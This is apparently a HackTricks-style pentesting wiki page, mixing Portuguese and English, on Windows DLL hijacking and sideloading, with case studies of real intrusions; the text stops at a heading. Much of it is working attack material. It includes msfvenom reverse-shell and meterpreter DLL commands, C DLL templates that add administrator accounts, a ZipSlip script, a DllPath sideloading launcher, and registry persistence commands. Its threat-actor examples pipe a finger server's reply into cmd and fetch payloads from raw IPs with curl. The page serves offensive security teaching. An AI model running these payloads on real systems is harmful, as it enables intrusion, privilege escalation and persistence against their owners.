# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informações Básicas

DLL Hijacking envolve manipular uma aplicação confiável para carregar uma DLL maliciosa. Este termo abrange várias táticas como **DLL Spoofing, Injection, and Side-Loading**. É usado principalmente para execução de código, alcançar persistência e, menos comumente, escalonamento de privilégios. Apesar do foco em escalonamento aqui, o método de hijack permanece consistente entre os objetivos.

### Técnicas Comuns

São empregados vários métodos para DLL hijacking, cada um com sua eficácia dependendo da estratégia de carregamento de DLL da aplicação:

1. **DLL Replacement**: Trocar uma DLL genuína por uma maliciosa, opcionalmente usando DLL Proxying para preservar a funcionalidade da DLL original.
2. **DLL Search Order Hijacking**: Colocar a DLL maliciosa em um caminho de busca antes da legítima, explorando o padrão de busca da aplicação.
3. **Phantom DLL Hijacking**: Criar uma DLL maliciosa para que a aplicação a carregue, acreditando ser uma DLL necessária inexistente.
4. **DLL Redirection**: Modificar parâmetros de busca como `%PATH%` ou arquivos `.exe.manifest` / `.exe.local` para direcionar a aplicação para a DLL maliciosa.
5. **WinSxS DLL Replacement**: Substituir a DLL legítima por uma maliciosa no diretório WinSxS, método frequentemente associado com DLL side-loading.
6. **Relative Path DLL Hijacking**: Colocar a DLL maliciosa em um diretório controlado pelo usuário junto com a aplicação copiada, assemelhando-se a técnicas de Binary Proxy Execution.

> [!TIP]
> Para uma cadeia passo-a-passo que empilha HTML staging, AES-CTR configs, e .NET implants sobre DLL sideloading, reveja o fluxo de trabalho abaixo.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Encontrando DLLs ausentes

A maneira mais comum de encontrar DLLs ausentes em um sistema é executar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) do sysinternals, **definindo** os **seguintes 2 filtros**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e apenas mostrar a **File System Activity**:

![](<../../../images/image (153).png>)

Se você está procurando por **DLLs ausentes em geral** deixe isso rodando por alguns **segundos**.\
Se você está procurando por uma **DLL ausente dentro de um executável específico** você deve definir **outro filtro como "Process Name" "contains" `<exec name>`, executá-lo, e parar a captura de eventos**.

## Explorando DLLs Ausentes

Para escalar privilégios, a melhor chance que temos é ser capaz de **gravar uma dll que um processo privilegiado tentará carregar** em algum **local onde ela será procurada**. Portanto, poderemos **gravar** uma DLL em uma **pasta** onde a **DLL é procurada antes** da pasta onde a **DLL original** está (caso estranho), ou seremos capazes de **gravar em alguma pasta onde a DLL será procurada** e a DLL original **não existe** em nenhuma pasta.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

As aplicações Windows procuram por DLLs seguindo um conjunto de caminhos de busca predefinidos, obedecendo a uma sequência particular. O problema do DLL hijacking surge quando uma DLL maliciosa é colocada estrategicamente em um desses diretórios, garantindo que seja carregada antes da DLL autêntica. Uma solução para evitar isso é garantir que a aplicação use caminhos absolutos ao referenciar as DLLs que necessita.

Você pode ver a **DLL search order on 32-bit** sistemas abaixo:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Essa é a ordem de busca **default** com **SafeDllSearchMode** habilitado. Quando desabilitado, o diretório atual escala para o segundo lugar. Para desabilitar esse recurso, crie o valor de registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e defina-o como 0 (padrão é habilitado).

Se a função [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) for chamada com **LOAD_WITH_ALTERED_SEARCH_PATH**, a busca começa no diretório do módulo executável que o **LoadLibraryEx** está carregando.

Finalmente, note que **uma dll pode ser carregada indicando o caminho absoluto em vez do nome apenas**. Nesse caso, essa dll será **procurada apenas nesse caminho** (se a dll tiver dependências, elas serão procuradas como se tivessem sido carregadas apenas pelo nome).

Existem outras maneiras de alterar a ordem de busca, mas não vou explicá-las aqui.

### Chaining an arbitrary file write into a missing-DLL hijack

1. Use **ProcMon** filters (`Process Name` = target EXE, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) to collect DLL names that the process probes but cannot find.
2. If the binary runs on a **schedule/service**, dropping a DLL with one of those names into the **application directory** (search-order entry #1) will be loaded on the next execution. In one .NET scanner case the process looked for `hostfxr.dll` in `C:\samples\app\` before loading the real copy from `C:\Program Files\dotnet\fxr\...`.
3. Build a payload DLL (e.g. reverse shell) with any export: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. If your primitive is a **ZipSlip-style arbitrary write**, craft a ZIP whose entry escapes the extraction dir so the DLL lands in the app folder:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Deliver the archive to the watched inbox/share; when the scheduled task re-launches the process it loads the malicious DLL and executes your code as the service account.

### Forçando sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Uma forma avançada de influenciar de forma determinística o caminho de busca de DLL de um processo recém-criado é definir o campo DllPath em RTL_USER_PROCESS_PARAMETERS ao criar o processo usando as APIs nativas de ntdll. Ao fornecer aqui um diretório controlado pelo atacante, um processo alvo que resolve uma DLL importada pelo nome (sem caminho absoluto e sem usar as flags de carregamento seguro) pode ser forçado a carregar uma DLL maliciosa desse diretório.

Key idea
- Monte os parâmetros do processo com RtlCreateProcessParametersEx e forneça um DllPath personalizado que aponte para sua pasta controlada (por exemplo, o diretório onde seu dropper/unpacker está).
- Crie o processo com RtlCreateUserProcess. Quando o binário alvo resolver uma DLL pelo nome, o loader consultará este DllPath fornecido durante a resolução, possibilitando sideloading confiável mesmo quando a DLL maliciosa não estiver colocada junto ao EXE alvo.

Notas/limitações
- Isso afeta o processo filho que está sendo criado; é diferente de SetDllDirectory, que afeta apenas o processo atual.
- O alvo deve importar ou chamar LoadLibrary para uma DLL pelo nome (sem caminho absoluto e sem usar LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e caminhos absolutos hardcoded não podem ser hijacked. Forwarded exports e SxS podem alterar a precedência.

Minimal C example (ntdll, wide strings, simplified error handling):

<details>
<summary>Exemplo C completo: forçando sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- Coloque um xmllite.dll malicioso (exportando as funções necessárias ou fazendo proxy para o real) no diretório DllPath.
- Execute um binário assinado conhecido por procurar xmllite.dll pelo nome usando a técnica acima. O loader resolve a importação via o DllPath fornecido e faz sideload da sua DLL.

Esta técnica foi observada no mundo real para conduzir cadeias de sideloading em múltiplas etapas: um launcher inicial deposita um helper DLL, que então inicia um binário Microsoft-signed e hijackable com um DllPath customizado para forçar o carregamento do DLL do atacante a partir de um diretório de staging.


#### Exceptions on dll search order from Windows docs

Certas exceções à ordem padrão de busca de DLL são mencionadas na documentação do Windows:

- Quando uma **DLL que compartilha seu nome com uma já carregada na memória** é encontrada, o sistema ignora a busca usual. Em vez disso, ele realiza uma verificação por redirecionamento e um manifest antes de usar por padrão a DLL já na memória. **Nesse cenário, o sistema não realiza uma busca pela DLL**.
- Nos casos em que a DLL é reconhecida como uma **known DLL** para a versão atual do Windows, o sistema utilizará sua versão da known DLL, juntamente com quaisquer DLLs dependentes, **abrindo mão do processo de busca**. A chave do registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contém a lista dessas known DLLs.
- Caso uma **DLL tenha dependências**, a busca por essas DLLs dependentes é conduzida como se elas fossem indicadas apenas pelos seus **nomes de módulo**, independentemente de a DLL inicial ter sido identificada por um caminho completo.

### Escalating Privileges

**Requirements**:

- Identificar um processo que opera ou operará sob **privilégios diferentes** (movimento horizontal ou lateral), que esteja **sem uma DLL**.
- Garantir que haja **acesso de gravação** disponível para qualquer **diretório** no qual a **DLL** será **procurada**. Essa localização pode ser o diretório do executável ou um diretório dentro do PATH do sistema.

Sim, os requisitos são complicados de encontrar, pois **por padrão é meio estranho encontrar um executável privilegiado sem uma DLL** e é ainda **mais estranho ter permissões de gravação em uma pasta do PATH do sistema** (você não tem por padrão). Mas, em ambientes mal configurados isso é possível.\
No caso de você ter sorte e atender aos requisitos, você pode conferir o projeto [UACME](https://github.com/hfiref0x/UACME). Mesmo que o **objetivo principal do projeto seja bypass UAC**, você pode encontrar lá um **PoC** de um Dll hijaking para a versão do Windows que você pode usar (provavelmente apenas mudando o caminho da pasta onde você tem permissões de gravação).

Observe que você pode **verificar suas permissões em uma pasta** fazendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **verifique as permissões de todas as pastas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Você também pode verificar os imports de um executável e os exports de uma dll com:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para um guia completo sobre como **abusar Dll Hijacking para escalar privilégios** com permissões para escrever em uma **System Path folder** confira:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Ferramentas automatizadas

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará se você tem permissões de escrita em qualquer pasta dentro do system PATH.\
Outras ferramentas automatizadas interessantes para descobrir essa vulnerabilidade são as **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Exemplo

Caso você encontre um cenário explorável, uma das coisas mais importantes para explorá-lo com sucesso é **criar uma dll que exporte pelo menos todas as funções que o executável irá importar dela**. De qualquer forma, note que Dll Hijacking é útil para [escalar de Medium Integrity level para High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) ou de[ **High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Você pode encontrar um exemplo de **como criar uma dll válida** dentro deste estudo sobre dll hijacking focado em dll hijacking para execução: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Além disso, na **próxima seção** você pode encontrar alguns **códigos dll básicos** que podem ser úteis como **templates** ou para criar uma **dll com funções não necessárias exportadas**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

Basicamente um **Dll proxy** é uma DLL capaz de **executar seu código malicioso quando carregada**, mas também de **expor** e **funcionar** como o esperado, **repassando todas as chamadas para a biblioteca real**.

Com a ferramenta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ou [**Spartacus**](https://github.com/Accenture/Spartacus) você pode, na prática, **indicar um executável e selecionar a biblioteca** que deseja proxificar e **gerar uma dll proxificada** ou **indicar a Dll** e **gerar uma dll proxificada**.

### **Meterpreter**

**Obter rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obter um meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Criar um usuário (x86 — não vi uma versão x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Seu próprio

Observe que, em vários casos, a Dll que você compila deve **exportar várias funções** que serão carregadas pelo processo da vítima. Se essas funções não existirem, o **binary** não conseguirá carregá-las e o **exploit** falhará.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Exemplo de DLL C++ com criação de usuário</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL alternativa em C com entrada de thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Estudo de Caso: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

O Windows Narrator.exe ainda procura, na inicialização, um DLL de localização previsível e específico por idioma que pode ser explorado via DLL hijack para execução arbitrária de código e persistência.

Fatos chave
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se uma DLL gravável controlada por atacante existir no caminho OneCore, ela é carregada e `DllMain(DLL_PROCESS_ATTACH)` é executado. Não são necessários exports.

Descoberta com Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Inicie o Narrator e observe a tentativa de carregamento do caminho acima.

DLL mínima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack will speak/highlight UI. To stay quiet, on attach enumerate Narrator threads, open the main thread (`OpenThread(THREAD_SUSPEND_RESUME)`) and `SuspendThread` it; continue in your own thread. See PoC for full code.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- With the above, starting Narrator loads the planted DLL. On the secure desktop (logon screen), press CTRL+WIN+ENTER to start Narrator; your DLL executes as SYSTEM on the secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- RDP to the host, at the logon screen press CTRL+WIN+ENTER to launch Narrator; your DLL executes as SYSTEM on the secure desktop.
- Execution stops when the RDP session closes—inject/migrate promptly.

Bring Your Own Accessibility (BYOA)
- You can clone a built-in Accessibility Tool (AT) registry entry (e.g., CursorIndicator), edit it to point to an arbitrary binary/DLL, import it, then set `configuration` to that AT name. This proxies arbitrary execution under the Accessibility framework.

Notes
- Writing under `%windir%\System32` and changing HKLM values requires admin rights.
- All payload logic can live in `DLL_PROCESS_ATTACH`; no exports are needed.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

This case demonstrates **Phantom DLL Hijacking** in Lenovo's TrackPoint Quick Menu (`TPQMAssistant.exe`), tracked as **CVE-2025-1729**.

### Vulnerability Details

- **Component**: `TPQMAssistant.exe` located at `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` runs daily at 9:30 AM under the context of the logged-on user.
- **Directory Permissions**: Writable by `CREATOR OWNER`, allowing local users to drop arbitrary files.
- **DLL Search Behavior**: Attempts to load `hostfxr.dll` from its working directory first and logs "NAME NOT FOUND" if missing, indicating local directory search precedence.

### Exploit Implementation

An attacker can place a malicious `hostfxr.dll` stub in the same directory, exploiting the missing DLL to achieve code execution under the user's context:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Fluxo do Ataque

1. Como usuário padrão, coloque `hostfxr.dll` em `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Aguarde a tarefa agendada rodar às 9:30 AM no contexto do usuário atual.
3. Se um administrador estiver logado quando a tarefa for executada, a DLL maliciosa roda na sessão do administrador em medium integrity.
4. Encadear técnicas padrão de bypass de UAC para elevar de medium integrity para privilégios SYSTEM.

## Estudo de Caso: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Atores maliciosos frequentemente combinam droppers baseados em MSI com DLL side-loading para executar payloads sob um processo confiável e assinado.

Chain overview
- O usuário baixa o MSI. Uma CustomAction executa silenciosamente durante a instalação GUI (por exemplo, LaunchApplication ou uma ação VBScript), reconstruindo a próxima etapa a partir de recursos embutidos.
- O dropper grava um EXE legítimo e assinado e uma DLL maliciosa no mesmo diretório (par de exemplo: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando o EXE assinado é iniciado, a Windows DLL search order carrega wsc.dll do diretório de trabalho primeiro, executando código do atacante sob um pai assinado (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Procure por entradas que executam executáveis ou VBScript. Padrão suspeito de exemplo: LaunchApplication executando um arquivo embutido em segundo plano.
- No Orca (Microsoft Orca.exe), inspecione as tabelas CustomAction, InstallExecuteSequence e Binary.
- Payloads embutidos/divididos no CAB do MSI:
- Extração administrativa: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ou use lessmsi: lessmsi x package.msi C:\out
- Procure por múltiplos pequenos fragmentos que são concatenados e descriptografados por uma VBScript CustomAction. Fluxo comum:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading prático com wsc_proxy.exe
- Coloque estes dois arquivos na mesma pasta:
- wsc_proxy.exe: host legítimo assinado (Avast). O processo tenta carregar wsc.dll pelo nome a partir do seu diretório.
- wsc.dll: attacker DLL. Se não forem necessários exports específicos, DllMain pode ser suficiente; caso contrário, construa um proxy DLL e encaminhe os exports necessários para a biblioteca genuína enquanto executa o payload em DllMain.
- Construa um payload DLL mínimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Para requisitos de exportação, use um framework de proxy (por exemplo, DLLirant/Spartacus) para gerar um DLL de encaminhamento que também execute seu payload.

- Essa técnica depende da resolução de nomes de DLL pelo binário host. Se o host usar caminhos absolutos ou flags de carregamento seguro (por exemplo, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), o hijack pode falhar.
- KnownDLLs, SxS e forwarded exports podem influenciar a precedência e devem ser considerados na seleção do binário host e do conjunto de exports.

## Tríades assinadas + payloads criptografados (estudo de caso ShadowPad)

Check Point descreveu como Ink Dragon implanta ShadowPad usando uma **tríade de três arquivos** para se misturar com software legítimo enquanto mantém o payload principal criptografado no disco:

1. **Signed host EXE** – fornecedores como AMD, Realtek ou NVIDIA são abusados (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Os atacantes renomeiam o executável para parecer um binário do Windows (por exemplo `conhost.exe`), mas a assinatura Authenticode permanece válida.
2. **Malicious loader DLL** – colocado ao lado do EXE com um nome esperado (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). A DLL costuma ser um binário MFC ofuscado com o framework ScatterBrain; sua única função é localizar o blob criptografado, descriptografá-lo e reflectively map ShadowPad.
3. **Encrypted payload blob** – frequentemente armazenado como `<name>.tmp` no mesmo diretório. Após mapear em memória o payload descriptografado, o loader exclui o arquivo TMP para destruir evidências forenses.

Tradecraft notes:

* Renomear o EXE assinado (mantendo o `OriginalFileName` original no cabeçalho PE) permite que ele se passe por um binário do Windows e ainda retenha a assinatura do fornecedor, portanto reproduza o hábito do Ink Dragon de deixar binários com aparência de `conhost.exe` que na verdade são utilitários da AMD/NVIDIA.
* Como o executável permanece confiável, a maioria dos controles de allowlisting precisa apenas que sua DLL maliciosa esteja ao lado dele. Foque em customizar o loader DLL; o pai assinado normalmente pode rodar sem alterações.
* O decryptor do ShadowPad espera que o blob TMP esteja ao lado do loader e seja gravável para que possa zerar o arquivo após o mapeamento. Mantenha o diretório gravável até o payload ser carregado; uma vez em memória, o arquivo TMP pode ser excluído com segurança por OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operadores combinam DLL sideloading com LOLBAS para que o único artefato customizado em disco seja a DLL maliciosa ao lado do EXE confiável:

- **Remote command loader (Finger):** Um PowerShell oculto cria `cmd.exe /c`, obtém comandos de um servidor Finger e os direciona para `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` puxa texto via TCP/79; `| cmd` executa a resposta do servidor, permitindo que operadores rotacionem o segundo estágio no lado do servidor.

- **Built-in download/extract:** Baixe um arquivo com uma extensão benigna, descompacte-o e coloque o alvo de sideload e a DLL em uma pasta aleatória `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` oculta o progresso e segue redirects; `tar -xf` usa o tar embutido do Windows.

- **WMI/CIM launch:** Inicie o EXE via WMI para que a telemetria mostre um processo criado por CIM enquanto ele carrega a DLL colocada ao lado:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funciona com binários que preferem DLLs locais (por exemplo, `intelbq.exe`, `nearby_share.exe`); o payload (por exemplo, Remcos) roda sob o nome confiável.

- **Hunting:** Gera alertas em `forfiles` quando `/p`, `/m` e `/c` aparecem juntos; incomum fora de scripts administrativos.


## Estudo de caso: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uma intrusão recente do Lotus Blossom abusou de uma cadeia de atualização confiável para entregar um dropper empacotado com NSIS que preparou um DLL sideload e payloads totalmente em memória.

Tradecraft flow
- `update.exe` (NSIS) cria `%AppData%\Bluetooth`, marca como **HIDDEN**, solta um Bitdefender Submission Wizard renomeado `BluetoothService.exe`, um `log.dll` malicioso, e um blob criptografado `BluetoothService`, então lança o EXE.
- O EXE host importa `log.dll` e chama `LogInit`/`LogWrite`. `LogInit` mapeia o blob em memória via mmap; `LogWrite` o descriptografa com um stream customizado baseado em LCG (constantes **0x19660D** / **0x3C6EF35F**, material da chave derivado de um hash anterior), sobrescreve o buffer com shellcode em texto puro, libera temporários e faz jump para ele.
- Para evitar um IAT, o loader resolve APIs hasheando nomes de export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, então aplicando uma avalanche estilo Murmur (**0x85EBCA6B**) e comparando contra hashes alvo salinizados.

Main shellcode (Chrysalis)
- Descriptografa um módulo principal tipo PE repetindo add/XOR/sub com a chave `gQ2JR&9;` por cinco passagens, então carrega dinamicamente `Kernel32.dll` → `GetProcAddress` para finalizar a resolução de imports.
- Reconstrói strings de nomes de DLL em runtime via transformações por caractere bit-rotate/XOR, então carrega `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa um segundo resolver que percorre o **PEB → InMemoryOrderModuleList**, analisa cada tabela de export em blocos de 4 bytes com mistura estilo Murmur, e só recorre a `GetProcAddress` se o hash não for encontrado.

Embedded configuration & C2
- A config vive dentro do arquivo `BluetoothService` dropado no **offset 0x30808** (tamanho **0x980**) e é RC4-descriptografada com a chave `qwhvb^435h&*7`, revelando a URL do C2 e o User-Agent.
- Beacons constroem um perfil do host delimitado por pontos, prefixam a tag `4Q`, então RC4-encriptam com a chave `vAuig34%^325hGV` antes de `HttpSendRequestA` sobre HTTPS. Respostas são RC4-descriptografadas e despachadas por um switch de tags (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- O modo de execução é controlado por args CLI: sem args = instala persistência (service/Run key) apontando para `-i`; `-i` relança a si mesmo com `-k`; `-k` pula a instalação e executa o payload.

Alternate loader observed
